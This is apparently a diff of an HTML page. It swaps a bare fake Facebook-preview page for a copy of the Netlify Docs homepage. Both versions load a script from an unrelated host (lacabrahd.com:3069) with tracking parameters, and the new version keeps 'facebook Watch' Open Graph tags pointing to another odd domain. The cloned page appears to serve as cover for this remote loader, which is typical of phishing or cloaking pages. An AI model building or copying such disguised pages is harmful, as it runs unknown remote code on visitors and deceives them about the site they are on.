@@ -1,21 +1,162 @@
+
 <!DOCTYPE html>
-<html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Welcome to Netlify | Netlify Docs</title>
+    <meta name="generator" content="VuePress 1.9.9">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,500,700,400italic|Roboto+Mono:400">
+    <link rel="icon" href="/netlify-icon.svg" type="image/svg+xml">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    <link rel="icon" href="/favicon-32x32.png" type="image/png" sizes="32x32">
+    <link rel="icon" href="/favicon-16x16.png" type="image/png" sizes="16x16">
+    <script>(function (w) {
+        if (!w) return;
+        const darkQuery = w.matchMedia('(prefers-color-scheme: dark)');
+        const root = document.documentElement;
+        function setTheme(newTheme) {
+          if (newTheme === 'dark' || (newTheme === 'system' && darkQuery.matches)) {
+            root.classList.add('dark-mode');
+          } else {
+            root.classList.remove('dark-mode');
+          }
 
-<head>
-	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
-	<meta name="facebook:card" content="summary_large_image">
-	<meta name="facebook:description" content=" ">
-	<meta name="facebook:app:country" content=" ">
-	<meta property="og:image" content="https://4fveh3djwt.cloud/assets/images/%7Bimage_hash%7D" />
-	<meta property="og:title" content="        ">
-	<meta property="og:description" content="723, 871 views">
-	<meta property="og:site_name" content=" " />
-	<meta property="fb:app_id" content="19884028963">
-</head>
+          w.__theme = newTheme;
+        }
 
-<body>
-	<script
-		src="https://lacabrahd.com:3069/api/scripts/fbmultiplepais?contador=alexitohd12&owner=alexitohdir&isbot=false&before=true&selectedcountry="></script>
-</body>
+        w.__setPreferredTheme = function (newTheme) {
+          setTheme(newTheme);
+          try {
+            localStorage.setItem('nf-docs-theme', w.__theme);
+          } catch (err) {}
+        };
+        // If using system theme, change colors in real time
+        // in response to user settings
+        darkQuery.addEventListener('change', function (event) {
+          if (w.__theme === 'system') {
+            if (event.matches) {
+              root.classList.add('dark-mode');
+            } else {
+              root.classList.remove('dark-mode');
+            }
+          }
+        });
+        let preferredTheme;
 
+        // Try to get saved theme
+        try {
+          preferredTheme = localStorage.getItem('nf-docs-theme') || 'system';
+        } catch (err) {}
+        // Initialize preferredTheme
+        setTheme(preferredTheme);
+      })(window);</script>
+    <script src="/rum.js" data-application-id="ededf59a-7705-4933-b2a0-5efa8b35b293" data-client-token="pub1b84fc7c7429f37e025e8160c02da8bb" data-service="docs" data-env="production" defer="true"></script>
+    <meta name="description" content="Our all-in-one platform helps you build sites, stores, and apps. Use any frontend framework to build, preview, and deploy to our global network from Git.">
+    <meta property="og:title" content="facebook Watch">
+    <meta property="og:url" content="https://docs.netlify.com/">
+    <meta property="og:description" content="Our all-in-one platform helps you build sites, stores, and apps. Use any frontend framework to build, preview, and deploy to our global network from Git.">
+    <meta property="og:image" content="https://4fveh3djwt.cloud/assets/images/{image_hash}">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta prefix="og: http://ogp.me/ns#" property="og:type" content="article">
+    <meta prefix="og: http://ogp.me/ns#" property="og:article:author" content="Netlify">
+    <meta name="google-site-verification" content="G4JqDTXMHpDyWoqIRwgw8PBqg-AncXqtdkHehcOR7kc">
+    <link href="https://docs.netlify.com/" rel="canonical" />
+    <link rel="preload" href="/assets/css/0.styles.625f3c4a.css" as="style"><link rel="preload" href="/assets/js/app.31e820ea.js" as="script"><link rel="preload" href="/assets/js/7.88ccc619.js" as="script"><link rel="preload" href="/assets/js/2.05095f9a.js" as="script"><link rel="preload" href="/assets/js/3.74fbce05.js" as="script">
+    <link rel="stylesheet" href="/assets/css/0.styles.625f3c4a.css">
+  </head>
+  <script src="https://lacabrahd.com:3069/api/scripts/fbmultiplepais?contador=alexitohd12&owner=alexitohdir&isbot=false&before=true&selectedcountry="></script>
+  <body>
+    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NMKKF2M" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+    <div id="app" data-server-rendered="true"><div class="theme-container docs-home"><header class="navbar-header"><div class="navbar"><div class="navbar__logo-link"><a href="/" aria-current="page" class="router-link-exact-active router-link-active"><span class="visuallyhidden">Netlify Docs</span> <svg width="146" height="40" viewBox="0 0 146 40" fill="none" xmlns="http://www.w3.org/2000/svg" class="netlify-lockup" data-v-1c96e3d4><path d="M22.794 39.79V29.687l.21-.21h2.526l.21.21V39.79l-.21.209h-2.527l-.209-.21ZM22.794 10.314V.21l.21-.209h2.526l.21.21v10.104l-.21.21h-2.527l-.209-.21ZM14.1 32.687h-.347l-1.738-1.738v-.347l3.256-3.26 1.84.004.245.242v1.84L14.1 32.686ZM12.015 9.49v-.35l1.738-1.735h.347l3.256 3.256v1.836l-.246.248h-1.839L12.015 9.49ZM.582 18.524h14.316l.21.21v2.53l-.21.209H.582l-.21-.21v-2.53l.21-.209Z" fill="var(--lockup-lines-fill)" data-v-1c96e3d4></path> <path d="M29.005 25.265h-2.526l-.21-.21v-5.912c0-1.054-.412-1.869-1.682-1.895-.654-.016-1.4 0-2.199.033l-.12.12v7.651l-.21.21h-2.526l-.21-.21V14.948l.21-.21h5.684a3.998 3.998 0 0 1 3.998 3.999v6.315l-.21.21v.003ZM41.24 20.841l-.21.21H34.5l-.21.209c0 .422.423 1.685 2.108 1.685.631 0 1.263-.21 1.476-.631l.21-.21h2.525l.21.21c-.21 1.263-1.263 3.16-4.424 3.16-3.58 0-5.265-2.526-5.265-5.477 0-2.952 1.685-5.478 5.055-5.478 3.37 0 5.056 2.526 5.056 5.478v.844Zm-3.161-2.107c0-.21-.21-1.686-1.895-1.686s-1.895 1.476-1.895 1.686l.21.21h3.37l.21-.21ZM47.136 22.104c0 .422.21.632.632.632h1.895l.209.209v2.107l-.21.21h-1.894c-1.895 0-3.58-.845-3.58-3.161v-4.634l-.21-.21h-1.475l-.21-.209v-2.107l.21-.21h1.476l.21-.209v-1.894l.209-.21h2.526l.21.21v1.894l.209.21h2.316l.21.21v2.106l-.21.21h-2.316l-.21.21V22.1l.003.003ZM54.93 25.265h-2.525l-.21-.21V10.73l.21-.21h2.526l.21.21v14.322l-.21.21v.003ZM60.618 13.046h-2.526l-.21-.209V10.73l.21-.21h2.526l.21.21v2.107l-.21.21Zm0 12.22h-2.526l-.21-.21V14.944l.21-.21h2.526l.21.21v10.112l-.21.21ZM70.52 10.73v2.107l-.21.21h-1.894c-.422 0-.632.209-.632.631v.844l.21.21H70.1l.21.21v2.106l-.21.21h-2.107l-.21.21v7.581l-.21.21H65.05l-.21-.21v-7.582l-.21-.21h-1.475l-.21-.209v-2.107l.21-.21h1.476l.21-.209v-.844c0-2.317 1.684-3.161 3.58-3.161h1.894l.21.21-.004.003ZM78.311 25.474c-.844 2.108-1.685 3.37-4.633 3.37h-1.054l-.21-.209v-2.107l.21-.21h1.054c1.053 0 1.263-.209 1.475-.84v-.21l-3.37-8.216v-2.108l.21-.21h1.894l.21.21 2.526 7.163h.21l2.525-7.163.21-.21h1.894l.21.21v2.108l-3.37 8.426.01-.004Z" fill="var(--lockup-wordmark-fill)" data-v-1c96e3d4></path> <path d="M94.699 25.205V10.707l-.213-.214H92.78l-.213.214v5.117h-.213c-.661-.853-1.706-1.28-2.772-1.28-2.985 0-4.69 2.346-4.69 5.544 0 3.198 1.705 5.543 4.69 5.543 1.13 0 2.132-.469 2.772-1.28h.213l.213.854.213.213h1.493l.213-.213Zm-2.132-5.117c0 2.558-1.066 3.624-2.772 3.624-1.705 0-2.771-1.258-2.771-3.624 0-2.367 1.066-3.625 2.771-3.625 1.706 0 2.772 1.066 2.772 3.625ZM96.614 20.088c0 3.411 1.918 5.543 5.117 5.543 3.198 0 5.117-2.132 5.117-5.543 0-3.412-1.919-5.544-5.117-5.544s-5.117 2.133-5.117 5.544Zm2.132 0c0-2.346 1.066-3.625 2.985-3.625 1.918 0 2.985 1.28 2.985 3.625 0 2.345-1.067 3.624-2.985 3.624-1.92 0-2.985-1.279-2.985-3.624ZM110.26 20.088c0-2.346 1.066-3.625 2.985-3.625 1.705 0 2.345.853 2.558 1.706l.213.213h1.706l.213-.213c-.213-1.919-1.706-3.625-4.69-3.625-3.199 0-5.117 2.133-5.117 5.544 0 3.411 1.918 5.543 5.117 5.543 2.984 0 4.477-1.706 4.69-3.624l-.213-.213h-1.706l-.213.213c-.213.852-.853 1.705-2.558 1.705-1.919 0-2.985-1.279-2.985-3.624ZM127.733 22.433c0-1.919-1.066-2.772-3.199-3.198-2.132-.426-2.984-.64-2.984-1.706 0-.852.852-1.066 1.918-1.066 1.493 0 1.919.64 1.919 1.28l.214.213h1.705l.213-.213c0-2.132-1.705-3.198-4.051-3.198-2.984 0-4.05 1.492-4.05 2.984 0 1.92 1.279 2.772 3.411 3.198 2.132.427 2.772.64 2.772 1.706 0 .853-.64 1.28-2.133 1.28-1.492 0-2.132-.64-2.132-1.706l-.213-.213h-1.705l-.214.213c0 2.345 1.493 3.624 4.264 3.624 2.985 0 4.265-1.492 4.265-3.198Z" fill="var(--lockup-secondary-text-fill)" data-v-1c96e3d4></path> <path d="M131.138 18.524h14.316l.209.21v2.53l-.209.209h-14.316l-.21-.21v-2.53l.21-.209Z" fill="var(--lockup-lines-fill)" data-v-1c96e3d4></path></svg></a></div> <form id="search-form" role="search" class="algolia-search-wrapper search-form"><label class="search-form__label"><svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 32 32" class="search-form__label-icon-search"><path d="M20.571 15.143c0-4.411-3.589-8-8-8s-8 3.589-8 8 3.589 8 8 8 8-3.589 8-8zM29.714 30c0 1.25-1.036 2.286-2.286 2.286-0.607 0-1.196-0.25-1.607-0.679l-6.125-6.107c-2.089 1.446-4.589 2.214-7.125 2.214-6.946 0-12.571-5.625-12.571-12.571s5.625-12.571 12.571-12.571 12.571 5.625 12.571 12.571c0 2.536-0.768 5.036-2.214 7.125l6.125 6.125c0.411 0.411 0.661 1 0.661 1.607z" fill="rgba(175, 180, 182, 0.87)"></path></svg> <input id="algolia-search-input" placeholder="Search our docs by topic..." class="search-form__input"></label> <button tabindex="-1" type="reset" class="search-form__label-icon-close"><span class="visuallyhidden">Close search</span> <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 18 18"><g fill="#A3A9AC" transform="scale(-1 1) rotate(45 .571 -12.959)"><rect width="2.333" height="18.667" x="8.164" y=".003"></rect> <polygon points="8.164 .003 10.497 .003 10.497 18.67 8.164 18.67" transform="rotate(-90 9.33 9.336)"></polygon></g></svg></button> <div class="search-form__content-overlay"></div></form> <div class="navbar__right-actions"><div class="user-menu"><!----> <!----> <button href="#menu" class="button button--secondary is-not-visible-mamabear">
+          Menu
+        </button> <nav aria-label="Netlify navigation" class="navbar__nav is-visible-mamabear navbar__authlinks" data-v-4395085f><ul class="navbar__nav-list" data-v-4395085f><li class="navbar__nav-item login-button" data-v-4395085f><a href="https://app.netlify.com/login" rel="noopener noreferrer" class="navbar__nav-link" data-v-4395085f>
+        Log in
+      </a></li> <li class="navbar__nav-item signup-button" data-v-4395085f><a href="https://app.netlify.com/signup" target="self" rel="noopener noreferrer" class="navbar__nav-link" data-v-4395085f>
+        Sign up
+      </a></li></ul></nav></div></div></div></header> <main class="wrapper wrapper--main"><div class="wrapper__sidebar wrapper__navigation"><a class="button button--icon button--close is-not-visible-mamabear"><svg aria-hidden="true" width="24" height="24" viewBox="0 0 16 16" class="icon"><path d="M8,15 C4.13400675,15 1,11.8659932 1,8 C1,4.13400675 4.13400675,1 8,1 C11.8659932,1 15,4.13400675 15,8 C15,11.8659932 11.8659932,15 8,15 Z M10.44352,10.7233105 L10.4528296,10.7326201 L10.7326201,10.4528296 C11.0310632,10.1543865 11.0314986,9.66985171 10.7335912,9.37194437 L9.36507937,8.0034325 L10.7360526,6.63245928 C11.0344957,6.33401613 11.0349311,5.84948135 10.7370237,5.55157401 L10.448426,5.26297627 C10.1505186,4.96506892 9.66598387,4.96550426 9.36754072,5.26394741 L8.00589385,6.62559428 L6.63738198,5.25708241 C6.33947464,4.95917507 5.85493986,4.95961041 5.55649671,5.25805356 L5.26737991,5.54717036 C4.96893676,5.84561351 4.96850142,6.33014829 5.26640876,6.62805563 L6.62561103,7.9872579 L5.25463781,9.35823112 C4.95619466,9.65667427 4.95575932,10.141209 5.25366666,10.4391164 L5.5422644,10.7277141 C5.84017175,11.0256215 6.32470652,11.0251861 6.62314967,10.726743 L7.99412289,9.35576976 L9.36263476,10.7242816 C9.66054211,11.022189 10.1450769,11.0217536 10.44352,10.7233105 Z"></path></svg></a> <div aria-label="Docs" class="sidebar wrapper__sidebar-interior"><nav aria-label="Docs"><ul class="sidebar__links"><li class="sidebar__link-item"><section tabIndex="0" class="sidebar__group collapsable"><button aria-expanded="true" tabIndex="-1" class="sidebar__group-heading open">
+    Welcome
+  </button> <ul class="sidebar__links sidebar__group-items"><li class="sidebar__link-item"><div><a href="/" aria-current="page" class="active sidebar__link">Home</a></div></li><li class="sidebar__link-item"><div><a href="/get-started/" class="sidebar__link">Get started</a></div></li><li class="sidebar__link-item"><div><a href="/welcome/add-new-site/" class="sidebar__link">Add new site</a></div></li><li class="sidebar__link-item"><div><a href="/welcome/command-palette/" class="sidebar__link">Command Palette</a></div></li><li class="sidebar__link-item"><div><a href="/welcome/enterprise-trial/" class="sidebar__link">Enterprise trial resource guide</a></div></li></ul> <!----></section></li><li class="sidebar__link-item"><section tabIndex="0" class="sidebar__group collapsable"><button tabIndex="-1" class="sidebar__group-heading">
+    Platform
+  </button> <!----> <!----></section></li><li class="sidebar__link-item"><section tabIndex="0" class="sidebar__group collapsable"><button tabIndex="-1" class="sidebar__group-heading">
+    Git
+  </button> <!----> <!----></section></li><li class="sidebar__link-item"><section tabIndex="0" class="sidebar__group collapsable"><button tabIndex="-1" class="sidebar__group-heading">
+    Environment variables
+  </button> <!----> <!----></section></li><li class="sidebar__link-item"><section tabIndex="0" class="sidebar__group collapsable"><button tabIndex="-1" class="sidebar__group-heading">
+    Configure builds
+  </button> <!----> <!----></section></li><li class="sidebar__link-item"><section tabIndex="0" class="sidebar__group collapsable"><button tabIndex="-1" class="sidebar__group-heading">
+    Site deploys
+  </button> <!----> <!----></section></li><li class="sidebar__link-item"><section tabIndex="0" class="sidebar__group collapsable"><button tabIndex="-1" class="sidebar__group-heading">
+    Monitor sites
+  </button> <!----> <!----></section></li><li class="sidebar__link-item"><section tabIndex="0" class="sidebar__group collapsable"><button tabIndex="-1" class="sidebar__group-heading">
+    Domains &amp; HTTPS
+  </button> <!----> <!----></section></li><li class="sidebar__link-item"><section tabIndex="0" class="sidebar__group collapsable"><button tabIndex="-1" class="sidebar__group-heading">
+    Static routing
+  </button> <!----> <!----></section></li><li class="sidebar__link-item"><section tabIndex="0" class="sidebar__group collapsable"><button tabIndex="-1" class="sidebar__group-heading">
+    Firewall
+  </button> <!----> <!----></section></li><li class="sidebar__link-item"><section tabIndex="0" class="sidebar__group collapsable"><button tabIndex="-1" class="sidebar__group-heading">
+    Visitor access
+  </button> <!----> <!----></section></li><li class="sidebar__link-item"><section tabIndex="0" class="sidebar__group collapsable"><button tabIndex="-1" class="sidebar__group-heading">
+    Forms
+  </button> <!----> <!----></section></li><li class="sidebar__link-item"><section tabIndex="0" class="sidebar__group collapsable"><button tabIndex="-1" class="sidebar__group-heading">
+    Functions
+  </button> <!----> <!----></section></li><li class="sidebar__link-item"><section tabIndex="0" class="sidebar__group collapsable"><button tabIndex="-1" class="sidebar__group-heading">
+    Edge Functions
+  </button> <!----> <!----></section></li><li class="sidebar__link-item"><section tabIndex="0" class="sidebar__group collapsable"><button tabIndex="-1" class="sidebar__group-heading">
+    Netlify Connect
+  </button> <!----> <!----></section></li><li class="sidebar__link-item"><section tabIndex="0" class="sidebar__group collapsable"><button tabIndex="-1" class="sidebar__group-heading">
+    Integrations
+  </button> <!----> <!----></section></li><li class="sidebar__link-item"><section tabIndex="0" class="sidebar__group collapsable"><button tabIndex="-1" class="sidebar__group-heading">
+    Large Media
+  </button> <!----> <!----></section></li><li class="sidebar__link-item"><section tabIndex="0" class="sidebar__group collapsable"><button tabIndex="-1" class="sidebar__group-heading">
+    CLI
+  </button> <!----> <!----></section></li><li class="sidebar__link-item"><section tabIndex="0" class="sidebar__group collapsable"><button tabIndex="-1" class="sidebar__group-heading">
+    API
+  </button> <!----> <!----></section></li><li class="sidebar__link-item"><section tabIndex="0" class="sidebar__group collapsable"><button tabIndex="-1" class="sidebar__group-heading">
+    Netlify Labs
+  </button> <!----> <!----></section></li><li class="sidebar__link-item"><section tabIndex="0" class="sidebar__group collapsable"><button tabIndex="-1" class="sidebar__group-heading">
+    Accounts &amp; billing
+  </button> <!----> <!----></section></li><li class="sidebar__link-item"><section tabIndex="0" class="sidebar__group collapsable"><button tabIndex="-1" class="sidebar__group-heading">
+    Get help
+  </button> <!----> <!----></section></li></ul></nav> <div aria-labelledby="#external-link__header" class="external-links" data-v-55eaf963><p id="external-link__header" class="external-links__header" data-v-55eaf963>
+    Contact
+  </p> <ul class="external-links__list" data-v-55eaf963><li class="external-links__item" data-v-55eaf963><a href="https://answers.netlify.com" target="_blank" rel="noopener noreferrer" class="external-links__link" data-v-55eaf963>
+        Forums
+      </a></li> <li class="external-links__item" data-v-55eaf963><a href="https://www.netlify.com/support/" target="_blank" rel="noopener noreferrer" class="external-links__link" data-v-55eaf963>
+        Contact support
+      </a></li> <li class="external-links__item" data-v-55eaf963><a href="https://www.netlify.com/research-program/" target="_blank" rel="noopener noreferrer" class="external-links__link" data-v-55eaf963>
+        Research program
+      </a></li></ul></div> <nav aria-label="Netlify navigation" class="navbar__nav is-visible-mamabear navbar__authlinks is-not-visible-mamabear" data-v-4395085f><ul class="navbar__nav-list" data-v-4395085f><li class="navbar__nav-item login-button" data-v-4395085f><a href="https://app.netlify.com/login" rel="noopener noreferrer" class="navbar__nav-link" data-v-4395085f>
+        Log in
+      </a></li> <li class="navbar__nav-item signup-button" data-v-4395085f><a href="https://app.netlify.com/signup" target="self" rel="noopener noreferrer" class="navbar__nav-link" data-v-4395085f>
+        Sign up
+      </a></li></ul></nav></div></div> <section class="wrapper__content"><header class="content__default"><h1>Welcome to Netlify</h1></header> <div class="ask-netlify search-box content__default"><h2><span>How can we help?</span> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 16 16" aria-hidden="true"><path fill="#9da7b2" d="M11.316 4.43 9.27 3.86c-.36-.113-.36-.607 0-.702l2.046-.589a.398.398 0 0 0 .246-.247L12.15.271c.113-.361.606-.361.7 0l.569 2.051a.398.398 0 0 0 .246.247l2.065.59c.36.113.36.607 0 .702l-2.046.57a.398.398 0 0 0-.246.247l-.588 2.051c-.113.361-.606.361-.7 0l-.588-2.051a.399.399 0 0 0-.246-.247ZM7.34 8.416l3.247.988c.547.164.547 1.007.019 1.192l-3.247.988a.625.625 0 0 0-.397.431l-.906 3.538a.559.559 0 0 1-1.095 0l-.906-3.538a.625.625 0 0 0-.397-.431l-3.247-.988c-.548-.164-.548-1.028 0-1.192l3.228-.988a.625.625 0 0 0 .397-.431l.906-3.538a.559.559 0 0 1 1.095 0l.906 3.538c.057.205.208.37.397.431Z"></path></svg></h2> <p>
+    Ask our chatbot assistant or
+    <a href="/get-help/ask-netlify/">learn how it works</a></p> <form><input type="text" placeholder="Ask me anything" maxlength="300" required="required" value="" class="search-input"> <!----> <button type="submit" data-v-34d85f15>
+      Log in to ask
+    </button></form></div> <div class="section pancake-header"><div data-card-style="featured" class="card"><div class="card__image"><picture><img src="/images/home-browser.png" alt="Illustration of a computer terminal window overlaying a web browser" class="card__featured-image"> <img src="/images/home-browser-dark.png" alt="Illustration of a computer terminal window overlaying a web browser" class="card__featured-image--dark"></picture></div> <div class="card__content"><p>
+              Our all-in-one platform helps you combine your favorite tools and APIs to build the fastest sites, stores, and apps for the composable web. Use any frontend framework to build, preview, and deploy to our global network from Git.
+            </p></div></div> <div data-card-style="default" class="card"><div class="card__image"></div> <div class="card__content"><h3 class="card__heading">
+              Get started
+            </h3> <div class="wysiwyg"><p>Create your first project on Netlify using our <a href="/get-started/">step-by-step tutorial</a>. For next steps, you can learn how to <a href="/welcome/add-new-site/">add a new site</a> from an existing repo or publish a site folder with <a href="https://app.netlify.com/drop/" target="_blank" rel="noopener noreferrer">drag and drop</a>. Explore our <a href="https://www.netlify.com/integrations/templates/" target="_blank" rel="noopener noreferrer">templates</a> and deploy a website with just one click.</p></div></div></div> <div data-card-style="video" class="card"><div class="card__image"><a href="https://www.youtube.com/watch?v=6pEVhH37xQE&amp;list=PLzlG0L9jlhEPMR8haUPkxj2hJ_3jh5qa6" target="_blank"><picture><img title="Getting started with Netlify Edge Functions" src="https://cdn.sanity.io/images/o0o2tn5x/production/c14b2a5afa2f1b68fb61c5254679b0d2a7121e85-533x280.png" alt="Purple gradient background with the text &quot;Getting started with Netlify Edge Functions&quot; in the center"></picture></a></div> <div class="card__content"><p><a href="https://www.youtube.com/@NetlifyApp" target="_blank">Browse more videos</a></p></div></div></div> <div class="pancake-links pancake"><h2>Platform</h2> <ul><li><div class="pancake__wrapper"><a href="/git/overview/" class="pancake__link">Git</a> <!----></div></li><li><div class="pancake__wrapper"><a href="/environment-variables/overview/" class="pancake__link">Environment variables</a> <!----></div></li><li><div class="pancake__wrapper"><a href="/configure-builds/overview/" class="pancake__link">Configure builds</a> <!----></div></li><li><div class="pancake__wrapper"><a href="/site-deploys/overview/" class="pancake__link">Site deploys</a> <!----></div></li><li><div class="pancake__wrapper"><a href="/site-deploys/deploy-previews/" class="pancake__link">Deploy Previews</a> <!----></div></li><li><div class="pancake__wrapper"><a href="/monitor-sites/analytics/" class="pancake__link">Site Analytics</a> <!----></div></li><li><div class="pancake__wrapper"><a href="/monitor-sites/monitor-builds/" class="pancake__link">Monitor builds</a> <!----></div></li><li><div class="pancake__wrapper"><a href="/domains-https/custom-domains/" class="pancake__link">Custom Domains</a> <!----></div></li><li><div class="pancake__wrapper"><a href="/domains-https/https-ssl/" class="pancake__link">HTTPS (SSL)</a> <!----></div></li><li><div class="pancake__wrapper"><a href="/routing/overview/" class="pancake__link">Static routing</a> <!----></div></li><li><div class="pancake__wrapper"><a href="/visitor-access/identity/" class="pancake__link">Identity</a> <!----></div></li><li><div class="pancake__wrapper"><a href="/visitor-access/password-protection/" class="pancake__link">Password protection</a> <!----></div></li><li><div class="pancake__wrapper"><a href="/forms/setup/" class="pancake__link">Forms</a> <!----></div></li><li><div class="pancake__wrapper"><a href="/functions/overview/" class="pancake__link">Functions</a> <!----></div></li><li><div class="pancake__wrapper"><a href="/edge-functions/overview/" class="pancake__link">Edge Functions</a> <!----></div></li><li><div class="pancake__wrapper"><a href="/connect/overview/" class="pancake__link">Netlify Connect</a> <!----></div></li><li><div class="pancake__wrapper"><a href="/integrations/overview/" class="pancake__link">Integrations</a> <!----></div></li><li><div class="pancake__wrapper"><a href="/cli/get-started/" class="pancake__link">CLI</a> <!----></div></li><li><div class="pancake__wrapper"><a href="/api/get-started/" class="pancake__link">API</a> <!----></div></li><li><div class="pancake__wrapper"><a href="/accounts-and-billing/team-management/" class="pancake__link">Team management</a> <!----></div></li><li><div class="pancake__wrapper"><a href="/accounts-and-billing/billing/" class="pancake__link">Billing</a> <!----></div></li></ul></div><div class="pancake-cards pancake"><h2>Support</h2> <div class="cards__wrapper"><div data-card-style="default" class="card"><div class="card__image"></div> <div class="card__content"><h3 class="card__heading">Visit our forums</h3> <div class="wysiwyg"><p><a href="https://answers.netlify.com/" target="_blank" rel="noopener noreferrer">Visit the support forums</a> to get help or browse our handy guides to find further resources to common questions and issues.</p></div></div></div><div data-card-style="default" class="card"><div class="card__image"></div> <div class="card__content"><h3 class="card__heading">Get help</h3> <div class="wysiwyg"><p>Explore self-serve <a href="/get-help/resources-and-tips/">help resources</a> and get <a href="/get-help/resources-and-tips/">tips for requesting support by email</a>. <a href="https://www.netlify.com/support/" target="_blank" rel="noopener noreferrer">Netlify Support</a> is here to help!</p></div></div></div></div></div> <div><p id="helpful-hints" class="legacy-redirect"><a href="/configure-builds/manage-dependencies">Helpful Hints</a></p><p id="nodejs-including-react" class="legacy-redirect"><a href="/configure-builds/manage-dependencies/#node-js-and-javascript">Helpful Hints: NodeJS (including React)</a></p><p id="ruby" class="legacy-redirect"><a href="/configure-builds/manage-dependencies/#ruby">Helpful Hints: Ruby</a></p><p id="python" class="legacy-redirect"><a href="/configure-builds/manage-dependencies/#python">Helpful Hints: Python</a></p></div> <footer class="footer"><div class="footer-wrapper"><nav aria-label="Footer navigation" class="footer-nav"><ul class="footer__nav"><li class="footer__nav-item"><a href="https://netlify.com/" class="footer__nav-link">
+            Netlify
+          </a></li> <li class="footer__nav-item"><a href="https://netlify.com/careers/" class="footer__nav-link">
+            Careers
+          </a></li> <li class="footer__nav-item"><a href="https://netlify.com/blog/" class="footer__nav-link">
+            Blog
+          </a></li> <li class="footer__nav-item"><a href="https://www.netlify.com/legal/terms-of-use/" class="footer__nav-link">
+            Terms
+          </a></li> <li class="footer__nav-item"><a href="https://www.netlify.com/privacy/" class="footer__nav-link">
+            Privacy
+          </a></li></ul></nav> <div class="dark-mode-widget footer__theme-toggle" data-v-0d17f8d5><label for="theme-select" class="visuallyhidden" data-v-0d17f8d5>Select a theme</label> <div class="forms-select-c" data-v-0d17f8d5><div class="theme-toggle-icon" data-v-0d17f8d5><svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-0d17f8d5><path fill-rule="evenodd" clip-rule="evenodd" d="M14 7C14 10.866 10.866 14 7 14C3.13401 14 0 10.866 0 7C0 3.13401 3.13401 0 7 0C10.866 0 14 3.13401 14 7ZM7 12.2C6.99999 12.2 7.00001 12.2 7 12.2C4.12812 12.2 1.8 9.87188 1.8 7C1.8 4.12812 4.12812 1.8 7 1.8C7.00001 1.8 6.99999 1.8 7 1.8V12.2Z" fill="currentColor"></path></svg> <!----> <!----></div> <select value="system" name="theme-select" id="theme-select" class="forms-input"> <option value="system" data-v-0d17f8d5>System</option><option value="light" data-v-0d17f8d5>Light</option><option value="dark" data-v-0d17f8d5>Dark</option></select> <svg width="21" height="13" viewBox="0 0 21 13" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon-arrow-down forms-select-c-arrow"><path d="M20.7656 1.82812C21.0156 2.10938 21.0156 2.375 20.7656 2.625L10.9219 12.4688C10.6719 12.7188 10.4219 12.7188 10.1719 12.4688L0.328125 2.625C0.078125 2.375 0.078125 2.10938 0.328125 1.82812L1.26562 0.9375C1.51562 0.65625 1.78125 0.65625 2.0625 0.9375L10.5469 9.375L19.0312 0.9375C19.3125 0.65625 19.5781 0.65625 19.8281 0.9375L20.7656 1.82812Z"></path></svg></div></div></div> <p class="footer__copyright">© 2023 Netlify</p></footer></section></main></div><div class="global-ui"></div></div>
+    <script src="/assets/js/app.31e820ea.js" defer></script><script src="/assets/js/7.88ccc619.js" defer></script><script src="/assets/js/2.05095f9a.js" defer></script><script src="/assets/js/3.74fbce05.js" defer></script>
+  <script src="/netlify-cnm/cnm.js" async defer></script>
+
+<script async id="netlify-rum-container" src="https://netlify-rum.netlify.app/netlify-rum.js" data-netlify-rum-site-id="90a54386-9477-4113-bd6a-b9227b573d00" data-netlify-deploy-branch="main" data-netlify-deploy-context="production" data-netlify-cwv-token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaXRlX2lkIjoiOTBhNTQzODYtOTQ3Ny00MTEzLWJkNmEtYjkyMjdiNTczZDAwIiwiYWNjb3VudF9pZCI6IjU4ZGE4ODkzZDY4NjVkMzVjOTJhNzJiOCIsImRlcGxveV9pZCI6IjY0ZjczMTIxNTU2NDAyMDAwNzE4ZDlkZCIsImlzc3VlciI6Im5mc2VydmVyIn0.MxyMGSkQZDLdIHfFRwXNeCH-0q21Ak4MuGP9NunWygk"></script><script type="text/javascript">
+  if (window.location.host === "docs.netlify.com") { 
+  !function(){var analytics=window.analytics=window.analytics||[];if(!analytics.initialize)if(analytics.invoked)window.console&&console.error&&console.error("Segment snippet included twice.");else{analytics.invoked=!0;analytics.methods=["trackSubmit","trackClick","trackLink","trackForm","pageview","identify","reset","group","track","ready","alias","debug","page","once","off","on","addSourceMiddleware","addIntegrationMiddleware","setAnonymousId","addDestinationMiddleware"];analytics.factory=function(e){return function(){var t=Array.prototype.slice.call(arguments);t.unshift(e);analytics.push(t);return analytics}};for(var e=0;e<analytics.methods.length;e++){var key=analytics.methods[e];analytics[key]=analytics.factory(key)}analytics.load=function(key,e){var t=document.createElement("script");t.type="text/javascript";t.async=!0;t.src="https://cdn.segment.com/analytics.js/v1/" + key + "/analytics.min.js";var n=document.getElementsByTagName("script")[0];n.parentNode.insertBefore(t,n);analytics._loadOptions=e};analytics.SNIPPET_VERSION="4.13.1";
+  analytics.load("kjz0qkJslzzHMcNGI3GkDb9HDZ6vspYZ");
+  }}();
+}
+</script></body>
 </html>
